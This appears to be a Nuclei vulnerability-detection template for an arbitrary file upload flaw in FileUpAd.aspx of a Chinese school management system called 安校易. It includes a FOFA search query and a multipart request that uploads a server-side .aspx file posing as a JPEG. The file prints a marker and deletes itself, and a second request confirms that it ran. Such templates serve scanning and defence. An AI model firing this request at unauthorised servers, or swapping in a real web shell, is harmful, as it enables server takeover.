id: anxiaoyi-FileUpAd_aspx-file-upload

info:
  name: 智慧校园(安校易)管理系统 FileUpAd.aspx 任意文件上传
  author: HuanXiong
  severity: high
  description: |-
    fofa: app="智慧校园(安校易)管理系统"
    智慧校园(安校易)管理系统 FileUpAd.aspx 存在任意文件上传漏洞，攻击者可通过该漏洞上传恶意文件，进而控制服务器。
  reference: |
    -
  tags: File Upload

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /Module/FileUpPage/FileUpAd.aspx?file_tmid=upload HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        X-Requested-With: XMLHttpRequest
        Content-Type: multipart/form-data; boundary=----21909179191068471382830692394

        ------21909179191068471382830692394
        Content-Disposition: form-data; name="File"; filename="{{username}}.aspx"
        Content-Type: image/jpeg

        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
        ------21909179191068471382830692394--

      - |
        GET /imgnews/imgad/000000/upload.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        name: 任意文件上传
        dsl:
          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"